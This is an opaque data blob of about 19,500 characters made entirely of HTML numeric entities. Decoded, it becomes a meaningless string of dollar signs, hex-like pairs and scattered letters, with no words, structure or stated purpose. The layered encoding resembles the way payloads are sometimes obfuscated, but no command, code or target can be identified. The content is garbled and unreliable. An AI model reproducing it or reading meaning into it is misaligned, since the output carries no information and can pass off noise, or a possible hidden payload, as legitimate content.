&#36;&#57;&#57;&#53;&#100;&#36;&#102;&#99;&#36;&#77;&#36;&#97;&#55;&#100;&#36;&#98;&#99;&#36;&#99;&#50;&#67;&#85;&#36;&#97;&#102;&#36;&#53;&#98;&#36;&#97;&#57;&#36;&#98;&#48;&#36;&#107;&#36;&#99;&#98;&#36;&#101;&#97;&#36;&#56;&#51;&#86;&#56;&#99;&#36;&#100;&#56;&#36;&#55;&#98;&#36;&#77;&#36;&#51;&#98;&#36;&#51;&#99;&#36;&#101;&#56;&#56;&#36;&#101;&#57;&#112;&#36;&#51;&#98;&#36;&#122;&#36;&#100;&#100;&#36;&#99;&#54;&#36;&#97;&#100;&#89;&#36;&#112;&#36;&#101;&#51;&#48;&#84;&#36;&#77;&#36;&#89;&#78;&#36;&#98;&#98;&#36;&#104;&#101;&#36;&#97;&#97;&#36;&#101;&#51;&#36;&#118;&#36;&#104;&#90;&#36;&#57;&#51;&#36;&#98;&#49;&#36;&#77;&#121;&#36;&#102;&#55;&#115;&#36;&#98;&#99;&#90;&#36;&#85;&#36;&#56;&#52;&#36;&#98;&#99;&#105;&#68;&#36;&#101;&#97;&#36;&#101;&#100;&#36;&#101;&#100;&#36;&#78;&#53;&#103;&#36;&#57;&#100;&#65;&#36;&#75;&#102;&#66;&#36;&#56;&#102;&#57;&#84;&#36;&#51;&#97;&#36;&#56;&#55;&#101;&#36;&#102;&#99;&#36;&#67;&#36;&#98;&#102;&#36;&#97;&#52;&#36;&#105;&#102;&#36;&#98;&#50;&#102;&#36;&#113;&#36;&#57;&#53;&#36;&#99;&#56;&#36;&#101;&#56;&#36;&#57;&#49;&#36;&#57;&#54;&#36;&#101;&#54;&#104;&#36;&#100;&#98;&#36;&#101;&#97;&#36;&#99;&#98;&#36;&#97;&#102;&#53;&#116;&#36;&#99;&#98;&#69;&#36;&#97;&#102;&#36;&#57;&#98;&#36;&#57;&#57;&#57;&#36;&#57;&#101;&#100;&#36;&#57;&#101;&#36;&#100;&#99;&#36;&#100;&#51;&#50;&#36;&#53;&#101;&#36;&#99;&#51;&#36;&#97;&#102;&#100;&#36;&#102;&#99;&#36;&#103;&#36;&#98;&#102;&#36;&#101;&#49;&#36;&#100;&#98;&#36;&#100;&#102;&#36;&#99;&#101;&#68;&#105;&#51;&#36;&#53;&#100;&#36;&#85;&#36;&#90;&#55;&#36;&#102;&#48;&#36;&#102;&#50;&#36;&#102;&#99;&#36;&#106;&#36;&#55;&#101;&#36;&#95;&#36;&#101;&#51;&#36;&#80;&#36;&#102;&#56;&#36;&#97;&#51;&#36;&#56;&#48;&#36;&#51;&#102;&#36;&#102;&#49;&#36;&#116;&#81;&#36;&#102;&#101;&#36;&#56;&#99;&#36;&#98;&#102;&#48;&#36;&#121;&#36;&#100;&#52;&#36;&#102;&#51;&#36;&#106;&#36;&#88;&#36;&#101;&#48;&#36;&#100;&#100;&#36;&#57;&#55;&#117;&#36;&#56;&#99;&#120;&#36;&#54;&#48;&#103;&#36;&#100;&#54;&#36;&#74;&#36;&#57;&#56;&#36;&#57;&#54;&#36;&#99;&#51;&#36;&#76;&#36;&#99;&#49;&#36;&#122;&#36;&#55;&#99;&#36;&#90;&#36;&#55;&#102;&#36;&#99;&#53;&#36;&#118;&#114;&#122;&#71;&#36;&#56;&#49;&#36;&#52;&#48;&#36;&#102;&#57;&#36;&#97;&#52;&#36;&#65;&#116;&#36;&#99;&#55;&#36;&#56;&#54;&#54;&#101;&#36;&#106;&#36;&#97;&#97;&#73;&#36;&#97;&#97;&#36;&#101;&#51;&#52;&#36;&#57;&#57;&#36;&#101;&#54;&#36;&#113;&#77;&#36;&#56;&#54;&#36;&#56;&#51;&#36;&#101;&#100;&#36;&#51;&#100;&#36;&#51;&#100;&#36;&#100;&#55;&#71;&#86;&#36;&#56;&#54;&#87;&#36;&#71;&#86;&#36;&#97;&#100;&#88;&#36;&#82;&#36;&#100;&#56;&#36;&#98;&#52;&#65;&#36;&#56;&#97;&#36;&#98;&#97;&#49;&#36;&#100;&#52;&#36;&#67;&#36;&#100;&#52;&#69;&#84;&#36;&#101;&#97;&#36;&#57;&#55;&#36;&#56;&#53;&#36;&#56;&#57;&#36;&#98;&#53;&#74;&#36;&#98;&#97;&#36;&#118;&#36;&#98;&#52;&#36;&#98;&#57;&#57;&#68;&#36;&#57;&#100;&#36;&#57;&#101;&#36;&#56;&#101;&#57;&#36;&#74;&#74;&#36;&#97;&#53;&#36;&#87;&#36;&#101;&#56;&#104;&#107;&#50;&#36;&#101;&#50;&#36;&#68;&#36;&#99;&#54;&#36;&#97;&#53;&#36;&#102;&#97;&#36;&#97;&#48;&#77;&#53;&#36;&#100;&#55;&#36;&#98;&#52;&#82;&#106;&#36;&#98;&#53;&#76;&#36;&#56;&#55;&#36;&#99;&#50;&#36;&#85;&#114;&#36;&#53;&#100;&#36;&#109;&#36;&#98;&#55;&#36;&#98;&#53;&#36;&#52;&#48;&#36;&#111;&#36;&#99;&#101;&#36;&#99;&#51;&#36;&#101;&#54;&#36;&#101;&#99;&#36;&#57;&#98;&#100;&#36;&#102;&#53;&#36;&#101;&#99;&#75;&#36;&#100;&#51;&#73;&#36;&#99;&#55;&#36;&#100;&#56;&#36;&#101;&#98;&#68;&#36;&#71;&#36;&#57;&#100;&#84;&#36;&#98;&#50;&#49;&#36;&#97;&#48;&#36;&#80;&#36;&#99;&#54;&#36;&#101;&#99;&#36;&#56;&#99;&#36;&#101;&#49;&#52;&#101;&#36;&#57;&#100;&#36;&#102;&#101;&#36;&#100;&#48;&#36;&#57;&#53;&#36;&#57;&#51;&#98;&#36;&#57;&#100;&#36;&#56;&#54;&#57;&#36;&#101;&#48;&#36;&#77;&#106;&#36;&#66;&#36;&#90;&#36;&#97;&#102;&#36;&#101;&#51;&#111;&#36;&#98;&#99;&#36;&#101;&#48;&#36;&#102;&#102;&#78;&#36;&#51;&#100;&#36;&#99;&#53;&#36;&#98;&#57;&#36;&#115;&#36;&#114;&#36;&#56;&#53;&#36;&#56;&#97;&#86;&#36;&#76;&#36;&#101;&#56;&#73;&#36;&#120;&#99;&#72;&#36;&#83;&#36;&#99;&#102;&#76;&#36;&#84;&#36;&#102;&#57;&#36;&#100;&#50;&#36;&#54;&#48;&#36;&#100;&#56;&#36;&#98;&#54;&#101;&#36;&#100;&#51;&#36;&#57;&#98;&#36;&#100;&#55;&#101;&#36;&#100;&#48;&#36;&#97;&#48;&#36;&#101;&#56;&#36;&#57;&#101;&#36;&#102;&#52;&#36;&#98;&#98;&#36;&#97;&#56;&#36;&#101;&#52;&#36;&#115;&#36;&#116;&#80;&#36;&#102;&#53;&#36;&#85;&#36;&#101;&#100;&#122;&#36;&#100;&#98;&#36;&#100;&#50;&#36;&#56;&#100;&#76;&#36;&#97;&#54;&#36;&#100;&#48;&#36;&#108;&#36;&#99;&#53;&#109;&#36;&#53;&#98;&#36;&#100;&#52;&#53;&#84;&#36;&#57;&#48;&#36;&#100;&#54;&#36;&#100;&#48;&#68;&#36;&#110;&#79;&#36;&#99;&#97;&#110;&#36;&#57;&#97;&#36;&#101;&#99;&#36;&#97;&#53;&#36;&#97;&#50;&#36;&#97;&#54;&#36;&#98;&#53;&#36;&#56;&#100;&#36;&#102;&#101;&#36;&#113;&#89;&#36;&#104;&#89;&#36;&#57;&#55;&#48;&#36;&#57;&#50;&#36;&#100;&#52;&#77;&#36;&#102;&#51;&#102;&#114;&#54;&#82;&#36;&#97;&#51;&#90;&#36;&#102;&#49;&#36;&#101;&#50;&#36;&#57;&#57;&#36;&#98;&#51;&#36;&#95;&#36;&#101;&#51;&#36;&#89;&#36;&#97;&#52;&#36;&#98;&#51;&#36;&#57;&#50;&#114;&#69;&#102;&#36;&#97;&#53;&#36;&#78;&#36;&#100;&#98;&#36;&#97;&#49;&#36;&#56;&#97;&#36;&#97;&#102;&#116;&#36;&#97;&#99;&#78;&#107;&#36;&#99;&#56;&#36;&#98;&#48;&#36;&#53;&#98;&#99;&#36;&#100;&#99;&#36;&#57;&#102;&#57;&#36;&#99;&#49;&#36;&#57;&#50;&#36;&#112;&#85;&#36;&#100;&#52;&#36;&#118;&#120;&#36;&#98;&#49;&#36;&#56;&#52;&#73;&#36;&#55;&#101;&#36;&#53;&#99;&#48;&#36;&#55;&#100;&#36;&#77;&#36;&#98;&#55;&#82;&#36;&#56;&#52;&#36;&#97;&#51;&#36;&#98;&#99;&#36;&#74;&#76;&#36;&#100;&#100;&#104;&#36;&#53;&#99;&#36;&#98;&#97;&#36;&#97;&#53;&#36;&#99;&#56;&#36;&#102;&#51;&#36;&#101;&#101;&#36;&#121;&#36;&#97;&#53;&#36;&#116;&#69;&#36;&#57;&#56;&#36;&#83;&#36;&#97;&#102;&#36;&#56;&#100;&#36;&#99;&#50;&#36;&#97;&#54;&#36;&#98;&#54;&#72;&#36;&#99;&#49;&#36;&#69;&#36;&#57;&#57;&#52;&#120;&#120;&#36;&#98;&#53;&#49;&#36;&#69;&#36;&#56;&#51;&#36;&#114;&#36;&#67;&#36;&#51;&#97;&#36;&#102;&#100;&#36;&#99;&#52;&#68;&#36;&#51;&#99;&#36;&#101;&#57;&#36;&#99;&#52;&#36;&#121;&#36;&#56;&#50;&#36;&#122;&#36;&#56;&#97;&#36;&#101;&#53;&#36;&#100;&#99;&#36;&#67;&#116;&#113;&#36;&#57;&#48;&#73;&#116;&#36;&#53;&#101;&#36;&#98;&#48;&#36;&#113;&#36;&#56;&#51;&#95;&#36;&#51;&#101;&#53;&#83;&#36;&#97;&#99;&#36;&#102;&#99;&#36;&#57;&#56;&#116;&#36;&#97;&#57;&#36;&#97;&#50;&#36;&#51;&#98;&#36;&#104;&#36;&#101;&#56;&#36;&#51;&#101;&#36;&#97;&#50;&#36;&#99;&#98;&#36;&#119;&#36;&#57;&#54;&#78;&#36;&#104;&#36;&#102;&#99;&#36;&#102;&#101;&#36;&#74;&#36;&#57;&#100;&#36;&#100;&#55;&#36;&#102;&#100;&#51;&#49;&#72;&#121;&#36;&#99;&#99;&#36;&#105;&#36;&#97;&#98;&#48;&#36;&#101;&#53;&#36;&#55;&#100;&#36;&#85;&#36;&#111;&#36;&#57;&#97;&#115;&#36;&#100;&#99;&#36;&#102;&#98;&#36;&#57;&#57;&#36;&#84;&#36;&#56;&#97;&#36;&#56;&#55;&#36;&#101;&#100;&#36;&#57;&#50;&#115;&#36;&#54;&#48;&#79;&#121;&#36;&#101;&#100;&#36;&#100;&#55;&#36;&#98;&#51;&#36;&#98;&#54;&#77;&#101;&#36;&#53;&#99;&#36;&#89;&#36;&#97;&#52;&#36;&#99;&#53;&#36;&#74;&#36;&#99;&#98;&#83;&#73;&#36;&#97;&#99;&#36;&#56;&#97;&#36;&#56;&#50;&#67;&#51;&#36;&#112;&#36;&#90;&#36;&#97;&#51;&#36;&#102;&#49;&#36;&#51;&#102;&#81;&#36;&#113;&#36;&#101;&#55;&#36;&#98;&#50;&#36;&#98;&#102;&#36;&#97;&#56;&#36;&#97;&#54;&#36;&#98;&#56;&#36;&#115;&#106;&#36;&#57;&#100;&#102;&#36;&#57;&#100;&#36;&#97;&#98;&#77;&#36;&#98;&#56;&#69;&#36;&#101;&#57;&#36;&#74;&#110;&#36;&#101;&#49;&#36;&#97;&#49;&#36;&#118;&#36;&#116;&#36;&#101;&#52;&#36;&#98;&#51;&#36;&#36;&#36;&#101;&#51;&#36;&#56;&#50;&#36;&#112;&#36;&#97;&#53;&#36;&#97;&#54;&#36;&#97;&#102;&#36;&#100;&#48;&#111;&#36;&#100;&#57;&#36;&#53;&#100;&#49;&#36;&#57;&#101;&#36;&#102;&#57;&#36;&#114;&#36;&#101;&#55;&#36;&#100;&#48;&#36;&#101;&#102;&#36;&#79;&#75;&#36;&#107;&#55;&#82;&#36;&#101;&#48;&#36;&#98;&#101;&#36;&#102;&#51;&#36;&#101;&#52;&#36;&#57;&#52;&#36;&#83;&#36;&#81;&#72;&#36;&#109;&#36;&#80;&#89;&#36;&#51;&#100;&#36;&#99;&#100;&#36;&#99;&#98;&#66;&#36;&#99;&#49;&#36;&#97;&#102;&#36;&#122;&#36;&#97;&#49;&#102;&#36;&#101;&#98;&#36;&#77;&#36;&#57;&#52;&#82;&#36;&#56;&#101;&#36;&#101;&#55;&#36;&#82;&#72;&#36;&#56;&#49;&#36;&#95;&#97;&#36;&#101;&#101;&#36;&#98;&#49;&#118;&#36;&#84;&#36;&#102;&#101;&#85;&#36;&#114;&#36;&#98;&#99;&#36;&#121;&#113;&#36;&#99;&#55;&#36;&#57;&#52;&#116;&#36;&#98;&#99;&#36;&#98;&#54;&#36;&#57;&#52;&#36;&#98;&#98;&#36;&#85;&#36;&#51;&#102;&#36;&#99;&#49;&#54;&#104;&#36;&#102;&#101;&#36;&#102;&#49;&#36;&#53;&#101;&#36;&#57;&#98;&#95;&#36;&#97;&#50;&#36;&#100;&#55;&#36;&#102;&#50;&#36;&#100;&#51;&#36;&#57;&#99;&#36;&#56;&#101;&#36;&#99;&#98;&#113;&#119;&#36;&#101;&#50;&#36;&#101;&#55;&#36;&#102;&#55;&#52;&#36;&#99;&#57;&#75;&#36;&#97;&#49;&#109;&#109;&#36;&#97;&#49;&#36;&#57;&#57;&#36;&#85;&#36;&#100;&#99;&#36;&#100;&#97;&#36;&#101;&#50;&#86;&#36;&#121;&#36;&#56;&#53;&#36;&#97;&#50;&#101;&#36;&#57;&#102;&#99;&#100;&#120;&#36;&#97;&#50;&#36;&#53;&#99;&#36;&#56;&#101;&#36;&#99;&#102;&#112;&#36;&#97;&#55;&#36;&#51;&#100;&#36;&#51;&#102;&#75;&#36;&#111;&#36;&#97;&#53;&#36;&#98;&#97;&#36;&#51;&#97;&#36;&#51;&#102;&#102;&#76;&#36;&#99;&#51;&#36;&#56;&#57;&#108;&#36;&#101;&#101;&#36;&#101;&#101;&#36;&#57;&#99;&#36;&#98;&#56;&#36;&#104;&#36;&#99;&#56;&#36;&#99;&#48;&#68;&#36;&#97;&#54;&#36;&#122;&#36;&#57;&#53;&#36;&#101;&#54;&#36;&#97;&#51;&#36;&#56;&#49;&#36;&#51;&#101;&#36;&#99;&#102;&#36;&#97;&#56;&#54;&#36;&#102;&#100;&#36;&#56;&#52;&#36;&#105;&#36;&#99;&#100;&#36;&#100;&#50;&#36;&#98;&#52;&#36;&#100;&#48;&#36;&#102;&#51;&#73;&#36;&#102;&#49;&#36;&#114;&#36;&#100;&#100;&#36;&#66;&#36;&#101;&#97;&#36;&#98;&#50;&#36;&#51;&#98;&#36;&#89;&#36;&#36;&#36;&#77;&#118;&#36;&#102;&#99;&#36;&#101;&#102;&#36;&#36;&#36;&#99;&#48;&#66;&#36;&#102;&#97;&#36;&#53;&#101;&#36;&#56;&#99;&#36;&#56;&#48;&#36;&#102;&#102;&#36;&#57;&#52;&#36;&#100;&#51;&#36;&#116;&#36;&#83;&#36;&#55;&#100;&#36;&#119;&#36;&#100;&#49;&#36;&#98;&#97;&#36;&#56;&#57;&#118;&#36;&#88;&#36;&#100;&#49;&#36;&#57;&#51;&#36;&#98;&#101;&#36;&#57;&#97;&#36;&#101;&#48;&#36;&#53;&#100;&#54;&#36;&#67;&#36;&#102;&#54;&#36;&#69;&#36;&#102;&#56;&#36;&#102;&#55;&#36;&#100;&#51;&#36;&#102;&#53;&#36;&#98;&#52;&#36;&#102;&#97;&#36;&#53;&#99;&#98;&#36;&#70;&#36;&#113;&#36;&#55;&#101;&#67;&#36;&#97;&#49;&#36;&#56;&#99;&#36;&#56;&#98;&#36;&#57;&#54;&#36;&#100;&#102;&#36;&#67;&#36;&#80;&#100;&#36;&#83;&#36;&#98;&#56;&#79;&#36;&#118;&#36;&#100;&#98;&#36;&#97;&#56;&#36;&#57;&#52;&#117;&#36;&#118;&#36;&#101;&#53;&#36;&#97;&#51;&#36;&#102;&#48;&#36;&#101;&#52;&#36;&#101;&#48;&#85;&#36;&#55;&#99;&#57;&#36;&#73;&#36;&#72;&#49;&#36;&#99;&#102;&#119;&#36;&#69;&#98;&#95;&#36;&#98;&#57;&#82;&#36;&#82;&#36;&#101;&#100;&#36;&#102;&#51;&#36;&#117;&#82;&#36;&#98;&#52;&#36;&#99;&#102;&#36;&#98;&#98;&#36;&#121;&#36;&#51;&#97;&#36;&#56;&#99;&#36;&#100;&#97;&#36;&#74;&#98;&#36;&#114;&#36;&#116;&#36;&#99;&#97;&#36;&#36;&#81;&#36;&#102;&#51;&#36;&#56;&#99;&#36;&#99;&#50;&#36;&#97;&#102;&#36;&#100;&#50;&#36;&#99;&#49;&#89;&#36;&#57;&#100;&#36;&#99;&#98;&#115;&#36;&#57;&#56;&#36;&#97;&#100;&#121;&#36;&#99;&#55;&#80;&#36;&#100;&#53;&#36;&#97;&#55;&#122;&#71;&#80;&#36;&#97;&#100;&#36;&#102;&#57;&#36;&#99;&#54;&#36;&#97;&#48;&#36;&#102;&#52;&#36;&#97;&#57;&#36;&#98;&#101;&#36;&#82;&#36;&#100;&#52;&#104;&#36;&#56;&#50;&#36;&#119;&#36;&#101;&#52;&#48;&#36;&#97;&#55;&#111;&#36;&#101;&#51;&#113;&#36;&#97;&#56;&#99;&#36;&#97;&#56;&#36;&#101;&#100;&#36;&#104;&#65;&#36;&#53;&#100;&#36;&#117;&#36;&#56;&#55;&#36;&#98;&#57;&#36;&#57;&#55;&#36;&#100;&#50;&#95;&#36;&#79;&#36;&#102;&#51;&#36;&#98;&#97;&#36;&#56;&#54;&#36;&#99;&#55;&#95;&#36;&#76;&#36;&#118;&#101;&#57;&#36;&#97;&#56;&#36;&#102;&#55;&#67;&#36;&#79;&#36;&#118;&#36;&#102;&#51;&#36;&#101;&#57;&#36;&#101;&#53;&#36;&#109;&#36;&#112;&#107;&#36;&#102;&#99;&#36;&#99;&#98;&#114;&#36;&#98;&#56;&#36;&#109;&#36;&#56;&#102;&#36;&#101;&#97;&#113;&#81;&#36;&#51;&#100;&#36;&#105;&#36;&#100;&#53;&#36;&#101;&#98;&#36;&#97;&#50;&#122;&#57;&#36;&#97;&#97;&#79;&#36;&#102;&#53;&#36;&#98;&#100;&#49;&#36;&#101;&#97;&#48;&#36;&#57;&#101;&#36;&#100;&#50;&#36;&#51;&#99;&#36;&#99;&#97;&#36;&#102;&#99;&#36;&#97;&#101;&#36;&#98;&#51;&#36;&#100;&#49;&#113;&#36;&#101;&#56;&#36;&#102;&#102;&#36;&#56;&#51;&#36;&#98;&#101;&#36;&#53;&#100;&#36;&#84;&#103;&#36;&#52;&#48;&#95;&#87;&#36;&#69;&#36;&#53;&#100;&#36;&#101;&#49;&#66;&#87;&#112;&#104;&#36;&#99;&#57;&#36;&#56;&#53;&#36;&#57;&#54;&#56;&#116;&#36;&#97;&#53;&#90;&#36;&#102;&#57;&#36;&#99;&#54;&#36;&#100;&#48;&#36;&#97;&#97;&#36;&#102;&#56;&#116;&#36;&#101;&#56;&#113;&#36;&#99;&#97;&#36;&#56;&#102;&#36;&#80;&#36;&#102;&#98;&#36;&#101;&#57;&#107;&#36;&#101;&#57;&#66;&#36;&#102;&#101;&#100;&#36;&#56;&#100;&#36;&#57;&#52;&#36;&#99;&#49;&#87;&#112;&#36;&#57;&#97;&#36;&#51;&#102;&#89;&#36;&#112;&#107;&#114;&#36;&#102;&#55;&#101;&#110;&#118;&#36;&#101;&#102;&#36;&#99;&#49;&#98;&#90;&#36;&#102;&#100;&#84;&#36;&#75;&#36;&#98;&#51;&#72;&#36;&#98;&#50;&#36;&#103;&#36;&#100;&#55;&#36;&#54;&#48;&#36;&#79;&#36;&#100;&#97;&#36;&#101;&#57;&#36;&#100;&#102;&#36;&#56;&#51;&#36;&#36;&#36;&#100;&#52;&#36;&#97;&#49;&#36;&#80;&#115;&#36;&#82;&#36;&#56;&#55;&#36;&#75;&#36;&#84;&#36;&#102;&#51;&#36;&#74;&#107;&#36;&#66;&#36;&#79;&#36;&#109;&#36;&#56;&#48;&#36;&#72;&#36;&#97;&#56;&#36;&#55;&#99;&#36;&#107;&#65;&#36;&#51;&#100;&#36;&#107;&#36;&#99;&#51;&#36;&#111;&#36;&#105;&#36;&#99;&#54;&#36;&#83;&#36;&#102;&#97;&#36;&#99;&#101;&#108;&#36;&#99;&#48;&#36;&#99;&#98;&#36;&#73;&#36;&#98;&#97;&#36;&#57;&#97;&#36;&#53;&#101;&#36;&#97;&#53;&#36;&#83;&#36;&#51;&#97;&#77;&#114;&#36;&#102;&#102;&#36;&#113;&#36;&#98;&#57;&#36;&#102;&#102;&#36;&#54;&#48;&#36;&#110;&#36;&#120;&#67;&#36;&#51;&#100;&#36;&#102;&#51;&#99;&#36;&#82;&#36;&#57;&#98;&#36;&#56;&#55;&#36;&#114;&#36;&#97;&#99;&#36;&#107;&#36;&#78;&#36;&#101;&#99;&#74;&#36;&#69;&#73;&#36;&#102;&#51;&#36;&#67;&#36;&#98;&#54;&#36;&#74;&#36;&#66;&#36;&#100;&#54;&#75;&#36;&#102;&#99;&#109;&#36;&#99;&#52;&#36;&#108;&#36;&#113;&#36;&#55;&#101;&#36;&#56;&#54;&#36;&#102;&#56;&#36;&#98;&#55;&#36;&#84;&#36;&#102;&#102;&#36;&#53;&#101;&#36;&#121;&#101;&#36;&#72;&#36;&#98;&#48;&#36;&#77;&#81;&#36;&#98;&#50;&#36;&#101;&#56;&#36;&#77;&#36;&#97;&#97;&#36;&#99;&#101;&#36;&#54;&#48;&#57;&#36;&#69;&#36;&#102;&#52;&#36;&#100;&#48;&#36;&#101;&#102;&#36;&#78;&#36;&#67;&#54;&#36;&#56;&#102;&#36;&#57;&#51;&#36;&#111;&#36;&#100;&#49;&#36;&#100;&#100;&#36;&#100;&#101;&#36;&#57;&#56;&#36;&#116;&#36;&#83;&#77;&#36;&#52;&#48;&#36;&#97;&#102;&#36;&#56;&#48;&#36;&#57;&#98;&#36;&#69;&#50;&#36;&#85;&#36;&#101;&#51;&#36;&#97;&#52;&#36;&#100;&#55;&#51;&#36;&#57;&#100;&#36;&#78;&#84;&#36;&#57;&#102;&#36;&#99;&#49;&#36;&#97;&#50;&#73;&#36;&#56;&#57;&#36;&#55;&#102;&#97;&#36;&#99;&#49;&#56;&#36;&#98;&#57;&#36;&#99;&#99;&#69;&#36;&#115;&#36;&#52;&#48;&#36;&#99;&#49;&#36;&#69;&#108;&#36;&#97;&#57;&#36;&#104;&#36;&#116;&#36;&#51;&#102;&#36;&#56;&#52;&#98;&#36;&#100;&#56;&#73;&#36;&#99;&#99;&#36;&#100;&#50;&#103;&#36;&#98;&#54;&#36;&#56;&#101;&#36;&#97;&#51;&#36;&#71;&#36;&#86;&#36;&#100;&#51;&#104;&#36;&#102;&#52;&#67;&#84;&#110;&#36;&#99;&#50;&#36;&#111;&#36;&#99;&#56;&#36;&#99;&#53;&#36;&#115;&#36;&#98;&#56;&#36;&#57;&#99;&#36;&#98;&#51;&#36;&#97;&#99;&#36;&#121;&#36;&#55;&#100;&#36;&#98;&#52;&#88;&#36;&#78;&#112;&#51;&#36;&#102;&#100;&#121;&#36;&#97;&#56;&#36;&#102;&#51;&#36;&#98;&#54;&#36;&#100;&#49;&#36;&#102;&#102;&#107;&#36;&#100;&#98;&#36;&#76;&#36;&#122;&#90;&#36;&#100;&#101;&#65;&#36;&#98;&#98;&#36;&#98;&#57;&#36;&#57;&#52;&#36;&#99;&#51;&#36;&#57;&#55;&#70;&#113;&#36;&#100;&#49;&#36;&#71;&#36;&#101;&#53;&#98;&#101;&#65;&#36;&#79;&#36;&#56;&#49;&#36;&#99;&#101;&#36;&#101;&#53;&#36;&#100;&#52;&#65;&#36;&#76;&#36;&#57;&#55;&#83;&#36;&#100;&#100;&#36;&#100;&#52;&#111;&#84;&#36;&#87;&#36;&#56;&#100;&#98;&#49;&#36;&#57;&#53;&#36;&#101;&#99;&#36;&#83;&#36;&#97;&#50;&#107;&#36;&#107;&#36;&#100;&#53;&#36;&#99;&#51;&#57;&#36;&#97;&#97;&#36;&#56;&#55;&#36;&#56;&#97;&#36;&#97;&#51;&#36;&#102;&#101;&#36;&#90;&#52;&#36;&#100;&#48;&#36;&#97;&#102;&#36;&#101;&#54;&#85;&#36;&#36;&#36;&#110;&#36;&#74;&#36;&#53;&#101;&#36;&#57;&#102;&#74;&#36;&#57;&#48;&#36;&#99;&#98;&#80;&#115;&#113;&#36;&#90;&#36;&#97;&#53;&#76;&#36;&#84;&#85;&#36;&#97;&#102;&#86;&#36;&#97;&#49;&#86;&#36;&#105;&#36;&#53;&#100;&#36;&#122;&#36;&#57;&#53;&#36;&#97;&#102;&#36;&#97;&#101;&#36;&#97;&#99;&#36;&#97;&#100;&#36;&#97;&#99;&#36;&#57;&#53;&#36;&#107;&#102;&#36;&#57;&#54;&#90;&#81;&#36;&#53;&#98;&#36;&#98;&#57;&#74;&#36;&#57;&#51;&#85;&#36;&#102;&#57;&#56;&#36;&#100;&#98;&#36;&#97;&#54;&#36;&#75;&#36;&#97;&#97;&#76;&#56;&#36;&#57;&#97;&#95;&#36;&#102;&#53;&#36;&#108;&#103;&#36;&#101;&#98;&#85;&#36;&#55;&#102;&#36;&#79;&#75;&#115;&#88;&#36;&#97;&#54;&#36;&#121;&#119;&#36;&#51;&#98;&#78;&#115;&#36;&#102;&#55;&#36;&#99;&#97;&#36;&#97;&#53;&#36;&#57;&#101;&#36;&#112;&#36;&#73;&#81;&#36;&#56;&#102;&#36;&#56;&#98;&#36;&#100;&#49;&#36;&#105;&#36;&#99;&#50;&#36;&#100;&#97;&#36;&#121;&#117;&#36;&#57;&#54;&#36;&#101;&#97;&#36;&#116;&#74;&#36;&#56;&#52;&#36;&#117;&#36;&#120;&#36;&#56;&#56;&#36;&#98;&#50;&#36;&#102;&#50;&#36;&#90;&#36;&#56;&#56;&#36;&#100;&#97;&#36;&#101;&#99;&#49;&#36;&#57;&#97;&#36;&#67;&#99;&#88;&#69;&#36;&#56;&#53;&#36;&#55;&#98;&#36;&#100;&#57;&#36;&#89;&#36;&#36;&#36;&#101;&#102;&#83;&#103;&#36;&#56;&#102;&#36;&#101;&#48;&#77;&#57;&#36;&#97;&#99;&#36;&#99;&#101;&#36;&#101;&#49;&#36;&#56;&#97;&#36;&#105;&#36;&#97;&#101;&#36;&#105;&#36;&#99;&#49;&#85;&#36;&#53;&#99;&#66;&#36;&#112;&#110;&#36;&#97;&#51;&#36;&#51;&#97;&#36;&#55;&#98;&#36;&#85;&#107;&#114;&#104;&#36;&#99;&#97;&#36;&#101;&#49;&#106;&#36;&#97;&#100;&#36;&#99;&#97;&#36;&#86;&#36;&#97;&#100;&#36;&#57;&#97;&#36;&#85;&#36;&#100;&#53;&#36;&#97;&#97;&#36;&#100;&#52;&#36;&#97;&#97;&#81;&#36;&#53;&#99;&#36;&#99;&#51;&#36;&#108;&#57;&#36;&#97;&#99;&#36;&#51;&#100;&#36;&#73;&#81;&#105;&#36;&#107;&#36;&#56;&#54;&#87;&#36;&#97;&#100;&#36;&#111;&#66;&#36;&#100;&#101;&#36;&#98;&#48;&#36;&#87;&#36;&#97;&#53;&#36;&#57;&#53;&#36;&#98;&#98;&#87;&#36;&#97;&#100;&#86;&#36;&#98;&#98;&#36;&#110;&#36;&#97;&#56;&#36;&#101;&#54;&#36;&#101;&#52;&#122;&#77;&#81;&#36;&#57;&#53;&#36;&#74;&#36;&#101;&#101;&#36;&#98;&#53;&#36;&#101;&#53;&#100;&#36;&#118;&#55;&#36;&#98;&#50;&#70;&#36;&#97;&#100;&#81;&#36;&#86;&#36;&#100;&#97;&#68;&#36;&#99;&#56;&#36;&#51;&#101;&#109;&#36;&#56;&#101;&#36;&#51;&#97;&#36;&#56;&#55;&#36;&#98;&#98;&#36;&#100;&#49;&#86;&#36;&#101;&#52;&#70;&#36;&#97;&#100;&#90;&#36;&#97;&#98;&#36;&#99;&#101;&#36;&#99;&#57;&#36;&#98;&#98;&#49;&#36;&#100;&#49;&#112;&#36;&#99;&#97;&#36;&#51;&#97;&#36;&#101;&#97;&#54;&#36;&#97;&#101;&#36;&#102;&#57;&#36;&#98;&#97;&#106;&#36;&#51;&#99;&#119;&#75;&#36;&#79;&#36;&#101;&#100;&#74;&#36;&#99;&#55;&#36;&#69;&#97;&#36;&#97;&#101;&#36;&#98;&#50;&#36;&#51;&#101;&#36;&#100;&#102;&#36;&#56;&#56;&#36;&#100;&#99;&#36;&#100;&#100;&#36;&#100;&#101;&#73;&#109;&#36;&#104;&#36;&#75;&#36;&#100;&#97;&#36;&#101;&#97;&#36;&#100;&#52;&#36;&#98;&#97;&#73;&#109;&#36;&#98;&#100;&#36;&#99;&#51;&#36;&#57;&#56;&#69;&#70;&#107;&#36;&#102;&#101;&#36;&#102;&#100;&#36;&#57;&#53;&#108;&#36;&#102;&#56;&#36;&#99;&#99;&#36;&#100;&#100;&#36;&#99;&#51;&#36;&#102;&#48;&#108;&#120;&#36;&#56;&#50;&#36;&#99;&#97;&#36;&#99;&#48;&#102;&#36;&#99;&#55;&#36;&#100;&#56;&#36;&#74;&#106;&#36;&#115;&#36;&#98;&#48;&#36;&#57;&#51;&#36;&#101;&#99;&#36;&#70;&#122;&#36;&#101;&#54;&#36;&#100;&#98;&#36;&#102;&#52;&#81;&#106;&#36;&#76;&#36;&#54;&#48;&#36;&#70;&#36;&#57;&#53;&#36;&#99;&#52;&#36;&#119;&#36;&#103;&#36;&#98;&#99;&#36;&#57;&#55;&#81;&#36;&#97;&#51;&#36;&#97;&#101;&#36;&#97;&#54;&#66;&#36;&#98;&#56;&#36;&#56;&#97;&#36;&#103;&#36;&#97;&#101;&#36;&#57;&#49;&#36;&#57;&#97;&#112;&#36;&#78;&#117;&#36;&#99;&#97;&#36;&#100;&#53;&#36;&#98;&#52;&#107;&#36;&#99;&#54;&#90;&#36;&#98;&#52;